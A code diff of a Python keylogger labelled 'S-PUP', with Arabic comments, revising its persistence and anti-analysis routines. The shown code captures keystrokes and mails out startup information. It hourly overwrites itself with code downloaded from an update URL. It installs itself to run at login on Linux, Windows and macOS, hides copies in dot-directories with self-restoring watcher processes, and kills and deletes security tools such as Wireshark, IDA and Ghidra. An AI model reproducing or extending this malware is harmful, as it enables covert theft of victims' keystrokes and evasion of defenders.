@@ -62,11 +62,8 @@ key_mapping = {
     'Key.f6': '[F6]', 'Key.f7': '[F7]', 'Key.f8': '[F8]', 'Key.f9': '[F9]', 'Key.f10': '[F10]',
     'Key.f11': '[F11]', 'Key.f12': '[F12]',
 }
-log_file = os.path.join(
-    os.path.expanduser("~"),
-    ".local" if platform.system() != "Windows" else "AppData\\Roaming",
-    "spup_log.txt"
-)
+
+# ===== إرسال البريد =====
 # ===== إرسال البريد =====
 def send_email(subject, content):
     try:
@@ -237,27 +234,14 @@ def update_script():
     try:
         response = requests.get(update_url, timeout=10)
         if response.status_code == 200:
-            if getattr(sys, 'frozen', False):
-                # يعمل من ملف تنفيذي (مثل .exe)
-                script_dir = os.path.dirname(sys.executable)
-                new_script_path = os.path.join(script_dir, "update.py")
-            else:
-                # يعمل كـ .py
-                new_script_path = __file__
-
-            with open(new_script_path, 'w') as f:
+            with open(__file__, 'w') as f:
                 f.write(response.text)
-            print(f"[+] Script updated successfully: {new_script_path}")
-
-            # إعادة التشغيل من السكربت الجديد إذا كان يعمل من ملف تنفيذي
-            if getattr(sys, 'frozen', False):
-                subprocess.Popen(["python3", new_script_path])
-                sys.exit(0)
-
+            print("[+] Script updated successfully.")
         else:
             print(f"[-] Failed to download update. Status Code: {response.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"[-] Update error: {e}")
+
 # ===== التقاط الضغطات =====
 def on_press(key):
     try:
@@ -279,23 +263,13 @@ def on_press(key):
 
 # ===== بدء تشغيل اللوجر =====
 def start_logger():
-    try:
-        with keyboard.Listener(on_press=on_press) as listener:
-            listener.join()
-    except Exception as e:
-        print(f"[!] Logger error: {e}")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
 # ===== حفظ البرنامج في الخلفية =====
 
 def persist_script(output_filename):
     system = platform.system()
-
-    # معرفة المسار الحقيقي للملف الجاري تشغيله
-    if getattr(sys, 'frozen', False):
-        current_path = sys.executable  # عند التحويل إلى exe أو app أو bin
-    else:
-        current_path = os.path.abspath(__file__)  # أثناء التشغيل كـ .py
-
-    basename = os.path.basename(current_path)
 
     if system == "Linux":
         print("[*] System: Linux - Setting up systemd service...")
@@ -303,9 +277,13 @@ def persist_script(output_filename):
         user_service_path = os.path.expanduser("~/.config/systemd/user")
         os.makedirs(user_service_path, exist_ok=True)
 
+        # اسم الخدمة بناءً على اسم الملف
         service_name = os.path.splitext(output_filename)[0] + ".service"
         service_file_path = os.path.join(user_service_path, service_name)
+
+        # المسار الكامل للسكربت
         script_path = os.path.abspath(output_filename)
+
 
         service_content = f"""[Unit]
 Description=S-PUP Persistence Service for {output_filename}
@@ -314,7 +292,7 @@ After=network.target
 [Service]
 Type=simple
 WorkingDirectory={os.path.dirname(script_path)}
-ExecStart={sys.executable if getattr(sys, 'frozen', False) else '/usr/bin/python3'} {script_path}
+ExecStart=/usr/bin/python3 {script_path}
 Restart=always
 RestartSec=10
 
@@ -322,17 +300,25 @@ RestartSec=10
 WantedBy=default.target
 """
 
+        # إنشاء ملف الخدمة
         with open(service_file_path, 'w') as f:
             f.write(service_content)
 
         print(f"[+] Service created: {service_file_path}")
 
+        # إعادة تحميل الخدمات الخاصة بالمستخدم
         subprocess.run(["systemctl", "--user", "daemon-reload"])
+
+        # تفعيل وتشغيل الخدمة
         subprocess.run(["systemctl", "--user", "enable", service_name])
         subprocess.run(["systemctl", "--user", "start", service_name])
 
         print(f"[+] Service {service_name} enabled and started.")
+        
+        filename = os.path.abspath(__file__)
+        basename = os.path.basename(filename)
 
+    # قائمة مسارات خفية لا تحتاج صلاحيات root وتوجد دائمًا في أنظمة Linux
         hidden_paths = [
             os.path.expanduser("~/.config/.cache/"),
             os.path.expanduser("~/.local/share/.logs/"),
@@ -346,43 +332,47 @@ WantedBy=default.target
                 os.makedirs(path, exist_ok=True)
                 target_file = os.path.join(path, basename)
                 if not os.path.isfile(target_file):
-                    shutil.copy2(current_path, target_file)
+                    shutil.copy2(filename, target_file)
                     print(f"[+] Script copied to: {target_file}")
             except Exception as e:
                 print(f"[-] Error copying to {path}: {e}")
 
+    
+    #  ( حراس ) إطلاق النسخ الاحتياطية كمراقبين فقط
         def launch_backup_watchers(hidden_paths):
             for path in hidden_paths:
-                target = os.path.join(path, basename)
+                target = os.path.join(path, os.path.basename(__file__))
                 if os.path.isfile(target):
-                    subprocess.Popen(
-                        [target, "--watcher"] if getattr(sys, 'frozen', False)
-                        else ["/usr/bin/python3", target, "--watcher"],
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.Popen(["/usr/bin/python3", target, "--watcher"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         def watch_primary_script():
             while True:
                 if not os.path.isfile(script_path):
                     print("[!] Primary script missing. Promoting self to primary...")
                     try:
-                        shutil.copy2(current_path, script_path)
+                # نسخ نفسه إلى مكان السكربت الأصلي
+                        shutil.copy2(__file__, script_path)
+
+                # إعادة تفعيل الخدمة
                         subprocess.run(["systemctl", "--user", "enable", service_name])
                         subprocess.run(["systemctl", "--user", "start", service_name])
                         print("[+] Recovery completed by watcher.")
-                        break
+
+                        break  # توقف بعد النجاح
                     except Exception as e:
                         print(f"[-] Recovery failed: {e}")
-                time.sleep(60)
+
+                time.sleep(60)  # راقب كل دقيقة
+
+                
 
     elif system == "Windows":
         print("[*] System: Windows - Setting up Startup script...")
         startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-        os.makedirs(startup_folder, exist_ok=True)
         target_path = os.path.join(startup_folder, f"{output_filename}.bat")
         with open(target_path, 'w') as f:
-            exe_path = sys.executable if getattr(sys, 'frozen', False) else (shutil.which("pythonw") or "python")
-            f.write(f"@echo off\nstart \"\" \"{exe_path}\" \"{os.path.abspath(output_filename)}\"\n")
-        print(f"[+] Startup script created: {target_path}")
+            pythonw_path = shutil.which("pythonw") or "python"
+            f.write(f"@echo off\nstart {pythonw_path} {os.path.abspath(output_filename)}\n")
 
     elif system == "Darwin":
         print("[*] System: macOS - Setting up Launch Agent...")
@@ -391,70 +381,65 @@ WantedBy=default.target
 
         plist_file_path = os.path.join(launch_agents_path, f"com.{os.path.splitext(output_filename)[0]}.plist")
 
-        executable = sys.executable if getattr(sys, 'frozen', False) else "/usr/bin/python3"
-
         plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.{os.path.splitext(output_filename)[0]}</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>{executable}</string>
-        <string>{os.path.abspath(output_filename)}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-"""
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.{os.path.splitext(output_filename)[0]}</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>/usr/bin/python3</string>
+                <string>{os.path.abspath(output_filename)}</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+        </dict>
+        </plist>
+        """
 
         with open(plist_file_path, 'w') as f:
             f.write(plist_content)
 
+        # تحميل الـ plist لتشغيله فورًا
+        subprocess.run(["launchctl", "load", plist_file_path])
+
+        print(f"[+] Launch Agent created: {plist_file_path}")
         try:
             subprocess.run(["launchctl", "load", plist_file_path], check=True)
-            print(f"[+] Launch Agent created and loaded: {plist_file_path}")
         except subprocess.CalledProcessError:
             print("[!] Failed to load LaunchAgent. Check permissions or SIP settings.")
+
 
 def is_admin():
     try:
         if os.name == 'nt':
             # Windows
-            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            return os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin()
         else:
-            # Unix-like
-            return os.geteuid() == 0
-    except Exception as e:
-        print(f"[!] is_admin() check failed: {e}")
+            # Linux/macOS
+            return os.getuid() == 0
+    except:
         return False
 
-
 def kill_if_running(proc_name):
-    current_pid = os.getpid()
     for proc in psutil.process_iter(['name', 'pid']):
         try:
-            pname = proc.info['name']
-            pid = proc.info['pid']
-
-            if proc_name.lower() in pname.lower() and pid != current_pid:
-                print(f"[!] Found: {pname} (PID: {pid})")
+            if proc_name.lower() in proc.info['name'].lower():
+                print(f"[!] Found: {proc.info['name']} (PID: {proc.info['pid']})")
                 try:
                     proc.kill()
-                    print(f"[+] Killed {pname}")
+                    print(f"[+] Killed {proc.info['name']}")
                 except psutil.AccessDenied:
-                    print(f"[-] Access denied to kill {pname} - Skipping")
+                    print(f"[-] Access denied to kill {proc.info['name']} - Skipping")
                 except Exception as e:
-                    print(f"[-] Error killing {pname}: {e}")
+                    print(f"[-] Error killing {proc.info['name']}: {e}")
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
 
-
 def delete_app_if_possible(app_path):
-    try:
-        if os.path.exists(app_path):
+    if os.path.exists(app_path):
+        try:
             if os.access(app_path, os.W_OK):
                 if os.path.isdir(app_path):
                     shutil.rmtree(app_path)
@@ -463,8 +448,8 @@ def delete_app_if_possible(app_path):
                 print(f"[+] Removed app: {app_path}")
             else:
                 print(f"[-] No permission to delete {app_path}")
-    except Exception as e:
-        print(f"[-] Failed to delete {app_path}: {e}")
+        except Exception as e:
+            print(f"[-] Failed to delete {app_path}: {e}")
 
 def detect_and_block_tools():
     system = platform.system()
@@ -472,6 +457,7 @@ def detect_and_block_tools():
     is_root = is_admin()
     print(f"[*] OS Detected: {system} | User: {current_user} | Root/Admin: {is_root}")
 
+    # 🔎 أدوات مراقبة وتحليل شائعة
     suspicious_processes = [
         "wireshark", "tcpdump", "fiddler", "procmon", "processhacker",
         "ollydbg", "x64dbg", "ida64", "ida", "regshot", "dumpcap",
@@ -480,25 +466,25 @@ def detect_and_block_tools():
         "ghidra", "volatility", "sleuthkit", "autopsy"
     ]
 
+    # 🔐 مسارات شائعة لحذف الأدوات (إذا ممكن)
     known_paths = {
         "Windows": [
-            r"C:\Program Files\Wireshark\\",
-            r"C:\Program Files\Process Hacker 2\\",
-            r"C:\Program Files\IDA Pro\\"
+            "C:\\Program Files\\Wireshark\\",
+            "C:\\Program Files\\Process Hacker 2\\",
+            "C:\\Program Files\\IDA Pro\\"
         ],
         "Linux": [
             "/usr/bin/wireshark", "/usr/bin/ida64", "/usr/bin/gdb"
         ],
-        "Darwin": [
+        "Darwin": [  # macOS
             "/Applications/Wireshark.app/",
             "/Applications/IDA Pro.app/",
         ]
     }
 
     print("[*] Searching for known processes...")
-    current_pid = os.getpid()
     for proc in suspicious_processes:
-        kill_if_running(proc)  # الدالة محدثة سابقًا لتجنب قتل النفس
+        kill_if_running(proc)
 
     print("[*] Attempting to delete known app paths (if accessible)...")
     for path in known_paths.get(system, []):
@@ -506,17 +492,13 @@ def detect_and_block_tools():
 
     print("[+] Anti-analysis operations completed.\n")
 
-
+# ===== تشغيل البرنامج بشكل دائم =====
 def run_every_hour():
     while True:
         time.sleep(3600)
-        try:
-            update_script()
-        except Exception as e:
-            print(f"[!] Failed to update script: {e}")
+        update_script()  # تحديث السكربت كل ساعة
 
-
-# ===== تشغيل البرنامج الرئيسي =====
+# ===== تشغيل السكربت =====
 if __name__ == "__main__":
     if is_watcher:
         print("[*] Running in watcher mode...")
@@ -524,11 +506,9 @@ if __name__ == "__main__":
     else:
         print("[*] Running as primary script...")
 
-        # 1. التثبيت كخدمة
-        persist_script(os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__))
+        # 1. تثبيت السكربت كخدمة تعمل عند الإقلاع
+        persist_script(os.path.basename(__file__))
 
-        # 2. الحماية من التحليل
-        detect_and_block_tools()
 
         # 3. بدء تسجيل المفاتيح في الخلفية
         threading.Thread(target=start_logger, daemon=True).start()
@@ -536,8 +516,10 @@ if __name__ == "__main__":
         # 4. إرسال معلومات التشغيل
         send_startup_info()
 
-        # 5. التحديث عند البداية
+        # 5. تحديث السكربت عند البداية
         update_script()
 
-        # 6. التحديث كل ساعة
+        # 6. تحديث السكربت كل ساعة بشكل مستمر
         run_every_hour()
+        
+        detect_and_block_tools()
